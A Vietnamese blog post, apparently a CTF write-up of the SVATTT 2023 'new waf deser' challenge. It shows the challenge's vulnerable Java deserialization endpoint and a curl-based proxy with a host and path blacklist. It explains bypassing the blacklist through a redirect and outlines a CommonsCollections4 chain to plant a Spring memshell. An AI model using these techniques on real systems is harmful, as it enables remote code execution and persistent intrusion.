@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> SVATTT-2023 Ctf Writeup - The new Waf Deser | devme4f blogs</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="SVATTT-2023 Ctf Writeup - The new Waf Deser" />
+<meta property="og:description" content="Preface Gõ phím viết bài này thì cũng đã gần 2 tháng kể từ đợt final A&amp;D SVATTT 2023 kết thúc. Năm nay mình may may mắn được vào chung khảo chơi A&amp;D và với role là defense (cấu hình log, patch bug,..etc). Vào thi thì khá loạn &#43; nhiều việc, và vì mình role defense nên cũng chỉ ngó qua bài này và thấy backend y chang bài waf-deser năm trước khác mỗi phần front-end, tưởng dễ nên mình vẫn chưa mò lại xem, nay đến deadline hoàn thành task ở clb mới lụi cụi làm, thấy hay nên write up lại luôn, coi như làm tài liệu tham khảo cho các năm sau :D" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2023/svattt-2023_new-waf-deser/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-22T12:35:17+07:00" />
+<meta property="article:modified_time" content="2023-12-22T12:35:17+07:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SVATTT-2023 Ctf Writeup - The new Waf Deser"/>
+<meta name="twitter:description" content="Preface Gõ phím viết bài này thì cũng đã gần 2 tháng kể từ đợt final A&amp;D SVATTT 2023 kết thúc. Năm nay mình may may mắn được vào chung khảo chơi A&amp;D và với role là defense (cấu hình log, patch bug,..etc). Vào thi thì khá loạn &#43; nhiều việc, và vì mình role defense nên cũng chỉ ngó qua bài này và thấy backend y chang bài waf-deser năm trước khác mỗi phần front-end, tưởng dễ nên mình vẫn chưa mò lại xem, nay đến deadline hoàn thành task ở clb mới lụi cụi làm, thấy hay nên write up lại luôn, coi như làm tài liệu tham khảo cho các năm sau :D"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://devme4f.github.io/posts/2023/quick-note-spring-memshell/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://devme4f.github.io/posts/2024/tetctf-2024_j4v4-censored/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&text=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&is_video=false&description=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&title=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&name=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser&description=Preface%20G%c3%b5%20ph%c3%adm%20vi%e1%ba%bft%20b%c3%a0i%20n%c3%a0y%20th%c3%ac%20c%c5%a9ng%20%c4%91%c3%a3%20g%e1%ba%a7n%202%20th%c3%a1ng%20k%e1%bb%83%20t%e1%bb%ab%20%c4%91%e1%bb%a3t%20final%20A%26amp%3bD%20SVATTT%202023%20k%e1%ba%bft%20th%c3%bac.%20N%c4%83m%20nay%20m%c3%acnh%20may%20may%20m%e1%ba%afn%20%c4%91%c6%b0%e1%bb%a3c%20v%c3%a0o%20chung%20kh%e1%ba%a3o%20ch%c6%a1i%20A%26amp%3bD%20v%c3%a0%20v%e1%bb%9bi%20role%20l%c3%a0%20defense%20%28c%e1%ba%a5u%20h%c3%acnh%20log%2c%20patch%20bug%2c..etc%29.%20V%c3%a0o%20thi%20th%c3%ac%20kh%c3%a1%20lo%e1%ba%a1n%20%2b%20nhi%e1%bb%81u%20vi%e1%bb%87c%2c%20v%c3%a0%20v%c3%ac%20m%c3%acnh%20role%20defense%20n%c3%aan%20c%c5%a9ng%20ch%e1%bb%89%20ng%c3%b3%20qua%20b%c3%a0i%20n%c3%a0y%20v%c3%a0%20th%e1%ba%a5y%20backend%20y%20chang%20b%c3%a0i%20waf-deser%20n%c4%83m%20tr%c6%b0%e1%bb%9bc%20kh%c3%a1c%20m%e1%bb%97i%20ph%e1%ba%a7n%20front-end%2c%20t%c6%b0%e1%bb%9fng%20d%e1%bb%85%20n%c3%aan%20m%c3%acnh%20v%e1%ba%abn%20ch%c6%b0a%20m%c3%b2%20l%e1%ba%a1i%20xem%2c%20nay%20%c4%91%e1%ba%bfn%20deadline%20ho%c3%a0n%20th%c3%a0nh%20task%20%e1%bb%9f%20clb%20m%e1%bb%9bi%20l%e1%bb%a5i%20c%e1%bb%a5i%20l%c3%a0m%2c%20th%e1%ba%a5y%20hay%20n%c3%aan%20write%20up%20l%e1%ba%a1i%20lu%c3%b4n%2c%20coi%20nh%c6%b0%20l%c3%a0m%20t%c3%a0i%20li%e1%bb%87u%20tham%20kh%e1%ba%a3o%20cho%20c%c3%a1c%20n%c4%83m%20sau%20%3aD" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsvattt-2023_new-waf-deser%2f&t=SVATTT-2023%20Ctf%20Writeup%20-%20The%20new%20Waf%20Deser" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#docker-composeyml">docker-compose.yml</a></li>
+    <li><a href="#de-old-backend">de old backend</a></li>
+    <li><a href="#de-front">de front</a></li>
+    <li><a href="#deser">deser</a></li>
+    <li><a href="#anotherway-spring-view-manipulation-ssti-still-via-deser">Anotherway: Spring View Manipulation (SSTI) still, via deser</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        SVATTT-2023 Ctf Writeup - The new Waf Deser
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-12-22 12:35:17 &#43;0700 &#43;07" itemprop="datePublished">2023-12-22</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/deser" rel="tag">deser</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <h2 id="preface">Preface</h2>
+<p>Gõ phím viết bài này thì cũng đã gần 2 tháng kể từ đợt final <code>A&amp;D SVATTT 2023</code> kết thúc. Năm nay mình may may mắn được vào chung khảo chơi A&amp;D và với role là defense (cấu hình log, patch bug,..etc). Vào thi thì khá loạn + nhiều việc, và vì mình role defense nên cũng chỉ ngó qua bài này và thấy backend y chang bài <code>waf-deser</code> năm trước khác mỗi phần front-end, tưởng dễ nên mình vẫn chưa mò lại xem, nay đến deadline hoàn thành task ở clb mới lụi cụi làm, thấy hay nên write up lại luôn, coi như làm tài liệu tham khảo cho các năm sau :D</p>
+<p>Cũng chia sẻ thêm thì bài này trong đợt thi mình chỉ thấy 1 vài team là làm được, lúc đấy tự hỏi sao đề y chang năm trước, sửa mỗi tí lại ít solves thế. Nay xem kĩ thì mới thấy dù bài này không quá khó nhưng để build exploit hoàn chỉnh thì rất tốn time + bận exploit ở mỗi round attack nữa thì rất khó để hoàn thành.</p>
+<p>Anyway, bạn nào chưa đọc writeup bài <code>waf-deser</code> năm trước thì có thể đọc writeup mình viết tham khảo lại. Mình cũng sẽ weaponize deser theo hướng up spring memshell để persistent ở mọi round thay vì chỉ đọc flag.</p>
+<ul>
+<li><strong>src web02</strong>: <a href="https://drive.google.com/file/d/1TGM4H8hTohidrnB7OWkEPf4iOOxL9juA/view?usp=sharing">https://drive.google.com/file/d/1TGM4H8hTohidrnB7OWkEPf4iOOxL9juA/view?usp=sharing</a></li>
+<li><code>10.1.xx.93</code>: PUBLIC_IP</li>
+<li><code>ubuntu.lab</code>: web02 address</li>
+</ul>
+<h2 id="docker-composeyml">docker-compose.yml</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">front</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./front</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_front</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8004:5000&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>: 
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">back</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: <span style="color:#ae81ff">./back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">web2_back</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#66d9ef">no</span>-<span style="color:#ae81ff">internet</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">always</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">networks</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">internet</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">no-internet</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">internal</span>: <span style="color:#66d9ef">true</span>
+</span></span></code></pre></div><p>Sơ sơ qua thì file này deploy 2 services, trong đó service <code>back</code> vs <code>front</code> nằm cùng network là <code>no-internet</code>, không có outbound ra network khác. Phần <code>front</code> có expose port <code>8004</code> để conect đến được. Ý tưởng cũng chỉ có thể là dùng <code>front</code> để exploit <code>back</code>!</p>
+<h2 id="de-old-backend">de old backend</h2>
+<p>Phần deser ở <code>UserController</code> vẫn khá tương tự năm ngoái:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(
+</span></span><span style="display:flex;"><span>    value <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;/ticket/{info}&#34;</span>},
+</span></span><span style="display:flex;"><span>    method <span style="color:#f92672">=</span> {RequestMethod.<span style="color:#a6e22e">GET</span>}
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">getUser</span>(<span style="color:#a6e22e">@PathVariable</span>(<span style="color:#e6db74">&#34;info&#34;</span>) String info, <span style="color:#a6e22e">@RequestParam</span>(name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;compress&#34;</span>,defaultValue <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;false&#34;</span>) Boolean isCompress, Model model) {
+</span></span><span style="display:flex;"><span>    String unencodedData <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">unEncode</span>(info);
+</span></span><span style="display:flex;"><span>    String returnData <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> Base64.<span style="color:#a6e22e">getMimeDecoder</span>().<span style="color:#a6e22e">decode</span>(unencodedData);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (data.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> 2048) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            User user <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (isCompress) {
+</span></span><span style="display:flex;"><span>                InputStream is <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> GZIPInputStream(<span style="color:#66d9ef">new</span> ByteArrayInputStream(data));
+</span></span><span style="display:flex;"><span>                ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(is);
+</span></span><span style="display:flex;"><span>                user <span style="color:#f92672">=</span> (User)ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                ObjectMapper objectMapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectMapper();
+</span></span><span style="display:flex;"><span>                user <span style="color:#f92672">=</span> (User)objectMapper.<span style="color:#a6e22e">readValue</span>(data, User.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (user <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                model.<span style="color:#a6e22e">addAttribute</span>(<span style="color:#e6db74">&#34;user&#34;</span>, user);
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> user.<span style="color:#a6e22e">getRole</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/welcome&#34;</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception var10) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;common/error&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Tuy nhiên ở đây check thêm độ dài payload sau khi gzip chỉ được bé hơn <code>2048</code>, nếu lớn hơn sẽ không vào phần deser &ndash;&gt; failed. Exploit chỗ này vẫn có thể dùng chain <code>CC4</code> để deser (check file <code>pom.xml</code>) (thế thôi, phần dễ nhất 😀😀)</p>
+<h2 id="de-front">de front</h2>
+<p>Không còn sử dụng nginx mà là 1 con web python như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>FILTERED_HOSTS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;back&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FILTERED_PATHS <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;debug&#34;</span>, <span style="color:#e6db74">&#34;info&#34;</span>, <span style="color:#e6db74">&#34;ticket&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span> truncated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&lt;path:url&gt;&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proxy</span>(url):
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> make_request(
+</span></span><span style="display:flex;"><span>        str(url), request<span style="color:#f92672">.</span>method, dict(request<span style="color:#f92672">.</span>headers), request<span style="color:#f92672">.</span>get_data()
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_request</span>(url, method, headers<span style="color:#f92672">=</span>{}, data<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> is_approved(url):
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;curl/&#34;</span> <span style="color:#f92672">in</span> headers[<span style="color:#e6db74">&#34;User-Agent&#34;</span>]<span style="color:#f92672">.</span>lower():
+</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">403</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    curl_command <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;curl&#34;</span>, <span style="color:#e6db74">&#34;-L&#34;</span>, <span style="color:#e6db74">&#34;-k&#34;</span>, <span style="color:#e6db74">&#34;-X&#34;</span>, method, url]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> headers<span style="color:#f92672">.</span>items():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> key<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;host&#34;</span> <span style="color:#f92672">or</span> key<span style="color:#f92672">.</span>lower() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;user-agent&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        curl_command<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#34;-H&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>key<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> data:
+</span></span><span style="display:flex;"><span>        curl_command<span style="color:#f92672">.</span>extend([<span style="color:#e6db74">&#34;--data&#34;</span>, data<span style="color:#f92672">.</span>decode()])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        print(curl_command)
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
+</span></span><span style="display:flex;"><span>            curl_command, shell<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, capture_output<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result<span style="color:#f92672">.</span>stdout, <span style="color:#ae81ff">200</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(e)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify({<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error executing curl&#34;</span>}), <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_approved</span>(url):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Indicates whether the given URL is allowed to be fetched.  This
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    prevents the server from becoming an open proxy&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    parts <span style="color:#f92672">=</span> urlparse(url)
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> parts<span style="color:#f92672">.</span>hostname
+</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> parts<span style="color:#f92672">.</span>path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> parts<span style="color:#f92672">.</span>scheme <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#34;http&#34;</span>, <span style="color:#e6db74">&#34;https&#34;</span>]:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> host <span style="color:#f92672">in</span> FILTERED_HOSTS:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> filter_path <span style="color:#f92672">in</span> FILTERED_PATHS:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> filter_path <span style="color:#f92672">in</span> path:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span></code></pre></div><p>Con web này nhận target_url từ path và make request đến bằng curl, tuy nhiên target_url bị blacklist mất host là <code>back</code>, phần path thì là <code>&quot;debug&quot;, &quot;info&quot;, &quot;ticket&quot;</code> ==&gt; Không thể gọi trực tiếp đến <code>back</code> cũng như entrypoint <code>ticket</code> để deser.
+<img src="/images/2023/SVATTT-2023_new-waf-deser/back.png" alt="back"></p>
+<p>Loay hoay tìm cách bypass mình ngồi nhìn lại mới để ý thấy curl command trong function <code>make_request()</code> có option <code>-L</code> - sẽ follow redirect, và đây cũng chính là cách bypass. Mình host 1 httpserver lên và redirect url về <code>http://back/</code> sau đó cho service <code>front</code> request đến bị redirect là truy cập được service <code>back</code>:
+<img src="/images/2023/SVATTT-2023_new-waf-deser/redirect.png" alt="redirect"></p>
+<p><img src="/images/2023/SVATTT-2023_new-waf-deser/req_redirect.png" alt="req_redirect"></p>
+<h2 id="deser">deser</h2>
+<p>Vậy bây giờ mình đã có thể bypass blacklists ở service <code>front</code> và gửi request đến <code>back</code> để exploit deser, y chang bài năm trước 😱😱. Tất nhiên là không, cái khó là <code>back</code> không có outbound (không thể bắn reverse shell, output dns/http,..etc) thì chỉ có thể nghĩ đến cách dùng Spring Echo/Spring Memshell.</p>
+<p>Chain <code>CommonsCollections4</code> gọi đến sink là <code>TemplatesImpl</code> để load bytecode, nhờ đó chạy được java code thoải mái để RCE. Để sửa chain thay vì chạy command mà load Spring Echo/Spring Memshell thì sửa class bytecode được load là được.</p>
